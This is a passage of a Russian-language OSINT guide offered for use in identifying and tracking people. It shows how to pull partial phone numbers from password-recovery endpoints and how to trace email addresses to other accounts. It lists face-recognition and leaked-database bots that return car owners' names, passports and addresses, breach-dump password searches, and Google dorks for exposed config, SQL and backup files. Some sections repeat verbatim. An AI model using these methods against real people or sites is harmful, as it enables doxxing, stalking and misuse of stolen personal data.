[2] Создайте новый контакт только с адресом электронной почты
[3] Щелкните на созданный контакт и выберите вкладку LinkedIn
[4] Нажмите кнопку "Continue to LinkedIn" (Вам нужна учетная запись LinkedIn) и нажмите кнопку "accept" (Принять)
-------------------------------------------
Как найти аккаунт на gravatar.com по e-mail адресу
-------------------------------------------
[1] Откройте этот сайт (https://xorbin.com/tools/md5-hash-calculator) и впишите e-mail адрес в большое поле
[2] Нажмите на Calculate MD5 hash
[3] Скопируйте то что получилось, например 1aedb8d9dc4751e229a335e371db8058 (MD5 хэш)
[4] Подставьте то что скопировали в эту ссылку вместо MD5
https://gravatar.com/MD5

В результате вы можете получить аккаунт на gravatar в котором могут быть фото и контактные данные
-------------------------------------------
Как найти упоминание email адреса в GitHub 
-------------------------------------------
[1] Хэшируем в SHA1 здесь (http://www.sha1-online.com/) email адрес до знака @, т.е не адрес целиком а только логин
[2] Получаем например 4b9e910872a66d9b7d7e137ad70e3abfaad7eda7 и создаем новый проект Google BigQuery тут
 (https://console.cloud.google.com/bigquery?p=bigquery-public-data&d=github_repos&page=dataset)[3] В больше поле вводим это
select
    repo_name, commit,
    author.name, author.email,
    committer.name,  committer.email
from
    bigquery-public-data.github_repos.commits
where
  author.email like '4b9e910872a66d9b7d7e137ad70e3abfaad7eda7%'
  or 
  committer.email like '4b9e910872a66d9b7d7e137ad70e3abfaad7eda7%'

[5] Замените в коде выше фразу

4b9e910872a66d9b7d7e137ad70e3abfaad7eda7

на то что у вас получилось с SHA1

[4] Нажимаем "Выполнить", ожидаем, получаем таблицу из репозиториев, коммитов и "обезличенных" email-адресов
-------------------------------------------
Как найти альбом фото и профиль в Google Картах зная любой Email
-------------------------------------------
[1] Откройте на ПК hangouts.google.com и в левом углу кликните на контакты
[2] Нажмите создать чат и в поиске введите необходимый Пmail адрес
[3] Нажмите на имя аккаунта правой кнопкой и выберите инспектировать
[4] В инструментах разработчика найдите строку c hovercard-oid 
[5] После этой фразы будет ID длинной в 21 цифру, скопируйте этот ID
-------------------------------------------
Использование Google ID
-------------------------------------------
1. https://get.google.com/albumarchive/GoogleID/albums/profile-photos — замените GoogleID на те цифры которые вы скопировали, найдет альбом картинок аккаунта
2. https://www.google.com/maps/contrib/GoogleID — замените GoogleID на те цифры которые вы скопировали, найдет аккаунт в Google картах

Дополнительно:
-------------------------------------------
Поиск по Email с доменами rambler.ru / lenta.ru / autorambler.ru / myrambler.ru / ro.ru / rambler.ua
Поиск через URL
-------------------------------------------

1. https://avatars.rambler.ru/get/LOGIN@rambler.ru/default — картинка аккаунта, замените LOGIN@rambler.ru на email адрес

Как найти часть номера телефона по почте в rambler

[1] Открой восстановление пароля (https://id.rambler.ru/account/recovery)
[2] Введи почту и нажми продолжить
[3] Если просят ввести телефон, то читай следующий шаг
[5] Обнови страничку (F5)
[4] Запусти инструмент разработчика (Ctrl+Shift+I) и открой вкладку «сеть»
[5] Введи почту, реши капчу и нажми «Продолжить»
[6] Смотри на отправленные запросы, нужно найти запрос с URL: https://id.rambler.ru/api/v3/legacy/Rambler::Id::get_restore_info
[7] Нажми на этот запрос и открой вкладку ответ.

Во вкладке ответ, раскрой пункты, и там можно увидеть часть номера телефона. 

Если номера нет, то к аккаунту не привязан телефон

Поиск по E-mail адресу от ProtonMail
1. Как найти дату создания ProtonMail адреса

[1] Создайте или войдите в аккаунт на old.ProtonMail.com
[2] Откройте контакты (https://mail.protonmail.com/contacts) и нажмите на добавить контакт 
[3] В поле E-mail введите E-mail адрес ProtonMail
[4] Возле адреса появится шестеренка на которую нужно нажать
-------------------------------------------
Поиск по Email от Яндекса
-------------------------------------------
1. YaSeeker (https://github.com/HowToFind-bot/YaSeeker) (t) — найдет все профили и их данные на Яндексе


Поиск через URL

1. https://yandex.ru/collections/user/LOGIN — аккаунт в Яндекс Коллекциях, содержит имя и фото аккаунта. Замените LOGIN на юзернейм из адреса почты БЕЗ @yandex.ru
2. https://music.yandex.ru/users/LOGIN —  аккаунт в Яндекс Музыке, содержит имя и фото аккаунта. Замените LOGIN на юзернейм из адреса почты БЕЗ @yandex.ru

Как найти аккаунт в ВК зная e-mail адрес от Яндекса

[1] Уберите из адреса почты @yandex.ru, у вас останется логин
[2] Вставьте логин в ссылку https://api.music.yandex.net/users/LOGIN и перейдите по ссылке 
[3] Откройте исходный код страницы и найдите там строку SocialProfiles, там будет ссылка на профиль VK

Работает не со всеми аккаунтами

Как по адресу Яндекс почты найти отзывы на картах Яндекса

[1] Уберите из адреса почты @yandex.ru, у вас останется логин
[2] Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN
[3] Откройте исходный код страницы (Ctrl+U)
[4] Откройте поиск по странице (Ctrl+F) и введите туда public_id
[5] В результатах поиска будет 2 таких словосочетания, найдите второе
[6] После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать.
[7] Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали и откройте эту ссылку

Откроются отзывы на Яндекс картах, просмотренные фильмы/сериалы, отзывы на Яндекс Маркет и возможно что-то еще

Как найти аккаунт в Яндекс Народные Карты зная Яндекс email

[1] Замените LOGIN на юзернейм из адреса почты БЕЗ @yandex.ru и перейдите по ссылке

https://yandex.ru/collections/user/LOGIN

[2] Откройте исходный код страницы Ctrl + U
[3] Откройте поиск по странице Ctrl + F и введите в поиске cover_info
[4] В результате в коде перед фразой которую искали будут цифры, это ID аккаунта, скопируйте их
[5] Вставьте найденный ID аккаунта в ссылку ниже и откройте её

https://n.maps.yandex.ru/#!/users/ID

Где ID это ID аккаунта

Поиск по Email от Яндекса и Номеру Телефона

[1] Откройте ссылку для входа

https://passport.yandex.ru/auth

[2] Введите адрес почты от Яндекса и нажмите продолжить
[3] Пройдите капчу
[4] Введите номер телефона и кликните продолжить

Если появляется сообщение “неправильный номер телефона”, то телефон не привязан к адресу этой почты
-------------------------------------------
Поиск по Email от Mail.ru / inbox.ru / bk.ru / list.ru
-------------------------------------------
Поиск через URL

1. https://love.mail.ru/ru/LOGIN — профиль на сайте знакомств, замените LOGIN на email адрес без @mail.ru
2. https://account.mail.ru/api/v1/user/password/restore?email=LOGIN@mail.ru — выдаст часть номера телефона, замените LOGIN на email адрес без @mail.ru, попробуйте поменять @mail.ru на @list.ru, @bk.ru, @inbox.ru
-------------------------------------------
Поиск по Email почтового сервиса QQ.com
-------------------------------------------
1. @SGKMainBot —  находит аккаунт QQ, его ID, имя пользователя и пароль
                                                                         
-------------------------------------------
Создатель - Kanaizu
Проэкт - shrm
-------------------------------------------                                                          
                                                                         
-------------------------------------------
Поиск по фото с лицом
-------------------------------------------
1. search4faces.com — найдет профиль VK, OK, TikTok и Clubhouse, не точен
2. smartsearchbot.com — бот находит страницу в ВК, бесплатный поиск не доступен для новых пользователей
3. vk.watch — находит аккаунты ВКонтакте с похожими лицами, не точен, дождитесь загрузки фото
4. odyssey-search.info (r) — найдет аккаунт ВК и ОК, при регистрации можно указать любую российскую организацию, но ваш email чтобы получить логин и пароль 
5. pimeyes.com — показывает фото с похожими лицами и клонов, иногда сайт работает только через VPN
6. @pimeyesbot — найдет фото с лицом во всем интернете, результат приходит в течении 10 минут
7. @findmekz_bot (r) — найдет фото из ВК, регистрация возможна только пользователем с номером телефона Казахстана
8. @PinFaceBot — найдет аккаунт ВК, средняя точность поиска
9. @findfacerobot — найдет аватар с искомым лицом в ВК, Инстаграм, Clubhouse, Tiktok и OK ru
10. @facematch_bot (r) — найдет фото с таким же лицом взятых из сайтов Казахстана
11. camgirlfinder.net (https://camgirlfinder.net/search) — найдет веб-кам моделей, их ник и профиль
12. /file_image — список ресурсов для поиска по изображению

-------------------------------------------
Инструменты

1. faceplusplus.com (https://www.faceplusplus.com/face-comparing/) — сравнит два лица и покажет уровень схожести, открывать в версии для ПК
2. IAT (https://play.google.com/store/apps/details?id=tk.silviomarano.imageanalysistoolset) (a) — сравнит два лица и покажет уровень схожести, в приложении раздел Face insight, после пункт compare в списке
3. mxface.ai (https://mxface.ai/face-comparing#Face_Detection_demo_section) — сравнит два лица и покажет уровень схожести
-------------------------------------------

-------------------------------------------
По видео с лицом
1. scanner.deepware.ai — выявляет дипфейк
-------------------------------------------

-------------------------------------------
Поиск по фото с лицом
-------------------------------------------
1. search4faces.com — найдет профиль VK, OK, TikTok и Clubhouse, не точен
2. smartsearchbot.com — бот находит страницу в ВК, бесплатный поиск не доступен для новых пользователей
3. vk.watch — находит аккаунты ВКонтакте с похожими лицами, не точен, дождитесь загрузки фото
4. odyssey-search.info (r) — найдет аккаунт ВК и ОК, при регистрации можно указать любую российскую организацию, но ваш email чтобы получить логин и пароль 
5. pimeyes.com — показывает фото с похожими лицами и клонов, иногда сайт работает только через VPN
6. @pimeyesbot — найдет фото с лицом во всем интернете, результат приходит в течении 10 минут
7. @findmekz_bot (r) — найдет фото из ВК, регистрация возможна только пользователем с номером телефона Казахстана
8. @PinFaceBot — найдет аккаунт ВК, средняя точность поиска
9. @findfacerobot — найдет аватар с искомым лицом в ВК, Инстаграм, Clubhouse, Tiktok и OK ru
10. @facematch_bot (r) — найдет фото с таким же лицом взятых из сайтов Казахстана
11. camgirlfinder.net (https://camgirlfinder.net/search) — найдет веб-кам моделей, их ник и профиль
12. /file_image — список ресурсов для поиска по изображению

-------------------------------------------
Инструменты
-------------------------------------------

1. faceplusplus.com (https://www.faceplusplus.com/face-comparing/) — сравнит два лица и покажет уровень схожести, открывать в версии для ПК
2. IAT (https://play.google.com/store/apps/details?id=tk.silviomarano.imageanalysistoolset) (a) — сравнит два лица и покажет уровень схожести, в приложении раздел Face insight, после пункт compare в списке
3. mxface.ai (https://mxface.ai/face-comparing#Face_Detection_demo_section) — сравнит два лица и покажет уровень схожести

-------------------------------------------
По видео с лицом
-------------------------------------------

1. scanner.deepware.ai — выявляет дипфейк

1. metapicz.com — покажет EXIF
2. stolencamerafinder.com — определит EXIF и по этим данным найдет какие еще фото были сделаны этим устройством
3. exif.regex.info — извлекает META-данные
4. @mediainforobot — извлекает EXIF
5. 29a.ch (https://29a.ch/photo-forensics/#level-sweep) —  фото-форензика, анализ изображения на изменения
6. stylesuxx.github.io (https://stylesuxx.github.io/steganography/) — декодирует скрытое сообщение в изображении
7. Depix (https://github.com/beurtschipper/Depix) (t) — депикселизирует текст на картинке
8. focusmagic.com (t) — восстановит детали и резкость размытых фотографий
9. forensicdots.de — ищет на скане документа желтые точки являющиеся уникальным идентификатором принтера
10. diffchecker.com (https://www.diffchecker.com/image-diff/) — помогает найти различия двух картинок
11. compress-or-die.com (https://compress-or-die.com/analyze-process) — показывает ICC_Profile, в нем можно по скриншоту на Mac узнать дату последнего обновления системы, есть exif и таблица квантования яркости
12. exiftool.org (t) — программа для чтения, записи и редактирования метаинформации, определит производителя многих цифровых камер
13. exif-py (https://github.com/ianare/exif-py) (t) — выгружает метаданные из большого объёма изображений
-------------------------------------------
Поиск по картинке
-------------------------------------------
1. Yandex
 (https://yandex.ru/images/)2. Google (https://www.google.com/imghp) — открывать на ПК
3. Bing
 (https://www.bing.com/visualsearch)4. Tineye
 (http://tineye.com/)5. Mail.ru
 (https://go.mail.ru/search_images)6.  (https://go.mail.ru/search_images)searchbyimage.app (r) — находит товары в многих интернет-магазинах
7. thieve.co (http://thieve.co/tools/image-search) — находит товары в Aliexpress
8. aliseeks.com (https://www.aliseeks.com/search/)— находит товары в Aliexpress и eBay
9. labs.tib.eu (https://labs.tib.eu/geoestimation/) — найдет примерное место съемки фото
10. image.baidu.com
11. image.so.com
12. saucenao.com
13. depositphotos.com
(https://depositphotos.com/search/by-images.html)
-------------------------------------------
 Инструменты
-------------------------------------------
1. magiceraser.io — качественно удалит выделенную область на фото, необходимо для подготовки фото к поиску по картинке
2. waifu2x.booru.pics — улучшает качество картинки
-------------------------------------------
Для файла формата HAR
-------------------------------------------
1. stevesie.com (https://stevesie.com/har-file-web-scraper) — покажет содержимое файла в удобном виде
2. googleapps.com (https://toolbox.googleapps.com/apps/har_analyzer/) — покажет содержимое файла в удобном виде
-------------------------------------------
Для файла формата видео
-------------------------------------------
1. videoindexer.ai (r) — сохраняет лица, слова, темы, и эмблемы из видео
-------------------------------------------
Для файла формата DS_STORE
-------------------------------------------
1. intelx.io (https://intelx.io/tools?tab=filetool) — узнайте имена файлов скрытые в файле
-------------------------------------------
Для файла формата документ
-------------------------------------------
1. exif.regex.info — извлекает META-данные
2. @mediainforobot — извлекает EXIF
3. www.forensicdots.de — ищет на скане документа желтые точки являющиеся уникальным идентификатором принтера
4. exiftool.org (t) — программа для чтения, записи и редактирования метаинформации

-------------------------------------------
Инструменты
-------------------------------------------

1. draftable.com (https://draftable.com/compare) — сравнивает два документа показывает разницу
2. diffchecker.com (https://www.diffchecker.com/excel-diff/) — сравнивает документы PDF, таблицы Excel и показывает отличия между ними

-------------------------------------------
Для приложения расширения APK
-------------------------------------------
1. bevigil.com (https://bevigil.com/scanApp) (r) — покажет строки, ссылки, API методы приложения
-------------------------------------------
Поиск по регистрационному знаку или VIN авто в России
-------------------------------------------
1. AVinfoBot (https://avclick.me/v/AVinfoBot) — дает крупный отчет с данными владельца, историей авто и фото, получить бесплатный отчет возможно только если вы пригласите другой аккаунт в бот
2. vin01.ru — найдет VIN и по нему покажет историю регистраций, историю ДТП, пробег, ОСАГО и многое другое
3. vinformer.su (http://vinformer.su/#/Cheack-Vehicle/Captcha=0329976453/&_dm=no) — проверка ПТС, поиск по VIN
4. @AntiParkonBot — найдет номер телефона владельца, маловероятно что результат будет
5. nomerogram.ru — найдет фото автомобиля, поиск по гос. номеру
6. глазбога.com — находит полис, часть номера телефона, СТС и адреса парковок в Москве
7. checkvehicle.sfri.ru (https://checkvehicle.sfri.ru/AppCheckVehicle/app/main#cmdr0329976453) — сервис проверки управляемых инвалидом авто или используемых для перевозки инвалида
8. @clerkinfobot — находит ФИО, VIN, CNC, марку, ОСАГО
9. avtocod.ru — марка, модель, часть VIN
10. ГИБДД.РФ (https://xn--90adear.xn--p1ai/check/auto) — по VIN находит технические характеристики, периоды владения транспортным средством, участие в дорожно-транспортных происшествиях, розыск, ограничения, проверка наличия диагностической карты технического осмотра
11. odyssey-search.info (r) — по номерному знаку или VIN выдает технические характеристики авто, VIN, документы и адреса регистрации владельца авто, направления движения авто и прочее, а при регистрации можно указать любую российскую организацию
12. smartsearchbot.com — бот находит ФИО, VIN, телефон владельца, марку автомобиля, бесплатный поиск не доступен для новых пользователей
13. migalki.net — покажет фото авто, кто его загрузил на сайт и дату съёмки
14. @noblackAuto_bot — найдёт VIN, характеристики авто, ДТП, историю регистрации, объявления о продаже, регистрацию в такси
15. 230km.ru (https://230km.ru/%D0%93%D0%BE%D1%81%D0%9D%D0%BE%D0%BC%D0%B5%D1%80%D0%B0) — по номерному знаку найдет фото и комментарий к авто
16. @QuickOSINT_Robot — по номерному знаку или VIN найдет характеристики авто, фото, номер телефона, ФИО владельца, его паспорт и адрес регистрации, всего 3 бесплатных запроса для новых аккаунтов
17. @probei_ru_bot — по номерному знаку даст адрес регистрации, ФИО, VIN, марка и бренд авто, находит редко
18. @avtogramorg_bot (r) — по номерному знаку даст фото авто, модель, имя и возраст владельца, число поисков авто
19. reestr-zalogov.ru (http://www.reestr-zalogov.ru/search/index) — по VIN найдет ФИО владельца транспорта, паспорт, адрес регистрации, дату рождения, дату окончания кредита, описание транспорта и историю изменения этих данных
20. @n3fm4xw2rwbot — найдет имя владельца автомобиля, телефон
21. @Zernerda_bot — по номерному знаку ищет в двухсот слитых базах, найдет VIN, ФИО владельца, телефон, характеристики авто, бесплатный поиск после первого запуска бота
22. @declassified_bot — найдет ФИО, модель, VIN, телефон
23. @vin01bot — по гос номеру или VIN, найдет имя владельца, дтп, характеристики автомобиля, штрафы, работу в такси, тех осмотр и прочее
-------------------------------------------
Поиск по регистрационному знаку или номеру СТС в России
-------------------------------------------
1. гибдд.рф (https://xn--90adear.xn--p1ai/check/fines) — найдет штрафы на авто, даст причину, фото нарушения
2. Штрафы ГИБДД (https://vk.com/services?w=app6253254) (r) — найдет историю оплаты штрафа, фамилию плательщика, меняйте СТС и номер авто в настройках
-------------------------------------------
Поиск по позывному самолета
-------------------------------------------
1. de.flightaware.com — найдет историю перелетов, даст общую информацию о воздушном судне
2. globe.adsbexchange.com — найдет на карте все самолеты в воздухе с таким позывным, есть военные воздушные судна
3. planespotters.net (https://www.planespotters.net/production-list/index) — находит историю самолета, тех. состояние, авиакомпании
4. avherald.com — история инцидентов самолета
5. sanctionssearch.ofac.treas.gov — поиск в санкционном списке США
6. data.ntsb.gov (https://data.ntsb.gov/carol-main-public/basic-search) — информация о несчастных случаях, крушениях и расследований, поиск во всех странах
7. app02.bazl.admin.ch (https://app02.bazl.admin.ch/web/bazl/en/#/lfr/search) — реестр Швейцарии, найдет детали самолета, спасательную информацию, владельца и держателя самолета
-------------------------------------------
Поиск по модели самолета
-------------------------------------------
1. rzjets.net/aircraft — база моделей джетов, найдет владельца, регистрационный номер и многое другое
2. radarbox.com (https://www.radarbox.com/data/aircraft/) — найдет все самолеты в небе
3. globe.adsbexchange.com — найдет на карте все самолеты в воздухе такой модели, есть военные воздушные судна
4. seatguru.com (https://seatguru.com/browseairlines/browseairlines.php) — схема сидений самолета, есть номера мест
5. planespotters.net (https://www.planespotters.net/production-list/index) — находит историю самолета, позывные, тех. состояние, авиакомпании
6. avherald.com — история инцидентов самолета
7. data.ntsb.gov (https://data.ntsb.gov/carol-main-public/query-builder) — информация о несчастных случаях, крушениях и расследований, поиск во всех странах
8. app02.bazl.admin.ch (https://app02.bazl.admin.ch/web/bazl/en/#/lfr/search) — реестр Швейцарии, найдет детали самолета, спасательную информацию, владельца и держателя самолета

-------------------------------------------
Как найти историю перелётов по модели самолёта
-------------------------------------------

1. Скопируйте модель самолёта и откройте ссылку:

http://avionictools.com/icao.php

2. Введите в поле с параметром “N number” модель и нажмите Calc
3. Скопируй значение Hex
4. Подставь значение Hex в ссылку вместо HEX:

https://globe.adsbexchange.com/?icao=HEX

5. Открой эту ссылку, если самолёт нашёлся найти и открой вкладку History в карточке самолёта

Теперь можно листать или указать нужную дату, а сайт покажет перелёт на карте

-------------------------------------------
Поиск по номеру поезда в Европе
-------------------------------------------

1. pass.rzd.ru (https://pass.rzd.ru/tablo/public/ru?STRUCTURE_ID=5199) — показывает график следования, необходимо указать станцию прибытия на территории России
2. www.sncf.com (https://www.sncf.com/en/booking-itinerary/search-train-number/) — показывает расписание движения поезда в конкретную дату на территории Франции
3. bahn.de (https://reiseauskunft.bahn.de/bin/bhftafel.exe/en) — расписание движения поезда в конкретную дату на территории Германии
4. junatkartalla.vr.fi (https://junatkartalla.vr.fi/?lang=en-US) — фактическое движение поезда на карте в реальном времени, есть расписание остановок на территории Финляндии

-------------------------------------------
Поиск по номеру вогона
-------------------------------------------

1. gdevagon.ru (https://www.gdevagon.ru/scripts/references/check_car_number.php) (r) — проверит действительность номера

-------------------------------------------
Поиск по номеру поезда в Азии
-------------------------------------------

1. railyatri.in (https://www.railyatri.in/live-train-status) — расписание остановок поезда и фактический график движения с платформами прибытия и временем стоянки на территории Индии
-------------------------------------------
Поиск по имени судна
-------------------------------------------
1. marinetraffic.com — найдет позывной, MMSI, IMO, рейсы и историю имени судна
2. maritime-connector.com (http://maritime-connector.com/ship/) — найдет базовую информацию и данные о владельце
3. www.vesselfinder.com — найдет судно на карте в реальном времени
4. sanctionssearch.ofac.treas.gov — поиск в санкционном списке США
5. data.ntsb.gov (https://data.ntsb.gov/carol-main-public/query-builder) — информация о несчастных случаях, крушениях и расследований, поиск во всех странах
6. wwwapps.tc.gc.ca (https://wwwapps.tc.gc.ca/Saf-Sec-Sur/4/vrqs-srib/eng/vessel-registrations/search) — для судов Канады найдет историю владельцев, их имена и адреса, характеристики судна, его номера и прочее
7. inmarsat.com (https://www.inmarsat.com/en/support-and-info/support/ships-directory.html) — найдет контактный номер телефона
-------------------------------------------
Поиск по IMO судна
-------------------------------------------
1. marinetraffic.com — найдет позывной, MMSI, рейсы и историю имени судна
2. maritime-connector.com (http://maritime-connector.com/ship/) — найдет базовую информацию и данные о владельце
3. gisis.imo.org (https://gisis.imo.org/Public/Default.aspx) (r) — найдет адрес и название компании, сводку по эксплуатации кораблей
4. vesselfinder.com — найдет судно на карте в реальном времени
5. portcalltable.marinet.ru — покажет название, MMSI, позывной, характеристики, собственников, владельцев, даты заходов/выходов из российских портов, для поиска открой вкладку суды
6. inmarsat.com (https://www.inmarsat.com/en/support-and-info/support/ships-directory.html) — найдет контактный номер телефона
-------------------------------------------
Поиск по MMSI судна
-------------------------------------------
1. marinetraffic.com — найдет позывной, IMO, рейсы и историю имени судна
2. maritime-connector.com (http://maritime-connector.com/ship/) — найдет базовую информацию и данные о владельце
3. inmarsat.com (https://www.inmarsat.com/en/support-and-info/support/ships-directory.html) — найдет контактный номер телефона
-------------------------------------------
Поиск по позывному судна
-------------------------------------------
1. marinetraffic.com — найдет MMSI, IMO, рейсы и историю имени судна
2. maritime-connector.com (http://maritime-connector.com/ship/) — найдет базовую информацию и данные о владельце
3. vesselfinder.com — найдет судно на карте в реальном времени
4. portcalltable.marinet.ru — покажет название, MMSI, позывной, характеристики, собственников, владельцев, даты заходов/выходов из российских портов, для поиска открой вкладку суды
5. inmarsat.com (https://www.inmarsat.com/en/support-and-info/support/ships-directory.html) — найдет контактный номер телефона
-------------------------------------------
Поиск по номерному знаку судна
-------------------------------------------
1. ocn.ch (https://www.ocn.ch/fr/conduire/plaques-et-carte-grise/auto-index-trouver-un-detenteur-ou-une-detentrice-de-vehicule) — по номерному знаку судна во Фрибурге, Швейцариия, найдет адрес и ФИО его владель
-------------------------------------------
Поиск по номеру грузового контейнера
-------------------------------------------
1. panjiva.com (http://panjiva.com/search) — найдет содержимое и вес контейнера, имя компании грузоотправителя и грузополучателя, адрес грузополучателя и отгрузки, название судна, номер коносамента и другие данные
2. www.searates.com (https://www.searates.com/container/tracking/) — покажет дату и место отправки и прибытия, текущее местонахождение контейнера
3. www.track-trace.com (http://www.track-trace.com/container) — дает прямую ссылку на сайт транспортной компании где есть резюме контейнера, его маршруты, и детальный отчет о оборудовании и задержаниях

Поиск по паролю

1. @SGKMainBot — найдет аккаунты QQ и email адреса. поиск в китайской базе утечек
2. leakpeek.com (r)  — найдет часть имени пользователя и email, название утечки, открывать через VPN
3. глазбога.com (r) — бот, найдет часть номера телефона и email
4. haveibeenpwned.com (https://haveibeenpwned.com/Passwords) — даст знать утекал ли пароль
5. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым паролем
6. rslookup.com (https://rslookup.com/lookup) — покажет на каких сайтах была утечка с искомым паролем
7. ccjkm4pwid.onion.ws (http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion.ws/deepsearch) (r) —  найдет логин, email источник утечки
8. UsersBox.org — бот, найдет аккаунты, пароли, почты, имена, бесплатный период 14 дней для новых аккаунтов
9. leakedsource.ru — покажет в каких базах замечен пароль, даст домен и дату утечки
10. @QuickOSINT_Robot — найдет телефон, имя и email у которых одинаковый пароль, всего 3 бесплатных запроса для новых аккаунтов
11. @OffThisContactBot — найдет номер телефона, почту, для поиска создай и подключи свой тг-бот
12. @declassified_bot — найдет связанные адреса почт

Поиск по домену с .onion

1. darktracer.io — находит настоящий IP адрес
2. pidrila (https://github.com/enemy-submarine/pidrila) (t) — выявляет директории сайта
3. torwhois.com — показывает открытые порты, директории, PGP ключи, файлы в директориях и многое другое


Поиск через URL

1. https://osint.party/api/onion/DOMAIN — найдет метаданные сайта, замените DOMAIN на адрес сайта без .onion

Как найти сервер сайта на onion

https://chaos.institute/content/images/2021/03/flow.svg — схема с методами поиска
-------------------------------------------
Поисковые операторы для поиска по домену
-------------------------------------------
Операторы поиска Google и Яндекс — это символы и слова, с помощью которых можно уточнить и сузить поиск. Они бывают простыми и сложными и могут комбинироваться друг с другом. Некоторые поисковые операторы Google совпадают с теми, что используются в Яндекс, а некоторые работают только для конкретного поисковика


Дорки для Google

Замените site.com на домен

1. site:*.site.com

2. cache:site.com

3. inurl:site.com

4. site:site.com ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv

5. site:site.com intitle:index.of

6. site:site.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini | ext:env

7. site:site.com ext:sql | ext:dbf | ext:mdb

8. site:site.com ext:log

9. site:site.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup

10. site:site.com inurl:login | inurl:signin | intitle:Login | intitle:"sign in" | inurl:auth

11. site:site.com intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"

12. site:site.com "PHP Parse error" | "PHP Warning" | "PHP Error"

13. site:site.com ext:php intitle:phpinfo "published by the PHP Group"

14. site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org  | site:codeshare.io | site:trello.com "site.com"

15. site:github.com | site:gitlab.com "site.com"

16. site:site.com inurl:signup | inurl:register | intitle:Signup
-------------------------------------------
Поиск по домену с .ru
-------------------------------------------
1. backorder.ru — найдет историю изменений записей whois, возраст домена, покажет траффик посещений сайта и прочее
-------------------------------------------
Поиск по любому домену
-------------------------------------------
1. xinit.ru (https://xinit.ru/whois/) — найдет whois, DNS-записи, даст ссылки на поисковые ресурсы
2. hunter.io — дает email адреса
3. @WhoisDomBot — узнайте базовую информацию о домене
4. community.riskiq.com (r) — найдет сертификаты, историю whois, трекеры, reverse DNS и многое другое
5. Knock Subdomain Scan (https://github.com/guelfoweb/knock) (t) — находит под домены и FTP
6. builtwith.com — технологический профиль сайта, взаимосвязи между сайтами
7. cyber-hub.pw (https://cyber-hub.pw/domain_resolver.php) — распознаватель cloudflare, статус DNS, перебор под доменов и многое другое
8. urlscan.io — сервис для сканирования и анализа сайтов
9. dnsdumpster.com — обнаруживает хосты связанные с доменом
10. censys.io — находит какие серверы и устройства выставлены в сети
11. virustotal.com — служба пассивного DNS, поиск под доменов, найдет whois и историю сертификатов SSL
12. atsameip.intercode.ca — одинаковые IP у сайта, можно узнать под домены
13. spiderfoot.net (r) — автоматический поиск с использованием огромного количества методов, можно использовать в облаке если пройти регистрацию
14. dirhunt (https://github.com/Nekmo/dirhunt) (t) — поиск директорий сайта без брута
15. Amass (https://github.com/OWASP/Amass) (t) — сетевое картирование поверхностей атаки и обнаружение внешних ресурсов с использованием методов сбора информации с открытым исходным кодом и активных методов разведки
16. Photon (https://github.com/s0md3v/Photon) (t) — найдет на сайте файлы, секретные ключи, JS файлы, URL с параметрами 
17. dnslytics.com (https://dnslytics.com/reverse-analytics) — вытаскивает трекеры из сайта
18. domainwat.ch — найдет в Whois имя регистранта, адрес, номер телефона, адрес электронной почты из информации WHOIS и историю изменений
19. findomain (https://github.com/Edu4rdSHL/findomain) (t) — найдет под домены
20. shodan.io — найдет IP адреса и сайты с упоминанием искомого сайта
21. phonebook.cz (r) — найдет email, под домены, директории сайта
22. visualsitemapper.com (http://www.visualsitemapper.com/) — визуализация карты сайта одним графиком
23. dorks.faisalahmed.me — составляет дорки для Google и Яндекс
24. synapsint.com — хорошо ищет субдомены 
25. analyzeid.com — находит на странице идентификаторы аналитики и по ним ищет другие сайты
26. FavFreak (https://github.com/devanshbatham/FavFreak) (t) — находит все сайты схожим favicon
27. completedns.com (https://completedns.com/dns-history/) — история DNS
28. pidrila (https://github.com/enemy-submarine/pidrila) (t) — находит директории сайта
29. osint.sh — субдомены, история DNS, сканер NMAP и много другого
30. mmhdan.herokuapp.com — вычислит хеш значка сайта и даст ссылки на ресурсы где можно найти похожие сайты с одинаковыми значками
31. o365chk (https://github.com/nixintel/o365chk/) (t) — проверит наличие у сайта Microsoft Office365, выдаст email, облачное имя и ссылку для в хода в офис
32. pagexray.fouanalytics.com — найдет к каким сайтам делаются запросы для трекинга и аналитики, делает скриншот сайта
33. metagoofil (https://github.com/laramies/metagoofil) (t) — найдет метаданные во всех документах на сайте
34. email-format.com (https://www.email-format.com/i/search/) — даст email, дату их обнаружения и источник
35. tools.whoisxmlapi.com (https://tools.whoisxmlapi.com/whois-history-search) — найдет всю историю изменений whois домена
36. link-assistant.com (https://www.link-assistant.com/seo-spyglass/free-backlink-checker-tool.html) — найдет источники упоминания домена и их анализ
37. talosintelligence.com (https://talosintelligence.com/reputation_center/) — покажет сколько писем было отправлено с домена и его репутацию
38. leak-lookup.com (https://leak-lookup.com/search) (r) — покажет на каких сайтах была утечка с искомым доменом
39. app.netlas.io (r) — субдомены, устройства, IP адреса, CVE и уязвимости
40. domaincodex.com (https://www.domaincodex.com/search.php) — выдает субдомены, whois, файлы и прочее
41. SourceWolf (https://github.com/ksharinarayanan/SourceWolf) (t) — ищет в исходном коде и скриптах сайта ссылки на соц сети и эндпоинты
42. omnisint.io — найдет субдомены, регистрация без проверки
43. pulsedive.com — найдет историю DNS, SSL и Whois, почту, технологии, регистратора домена, порты, угрозы, субдомены, почтовые сервера и прочее
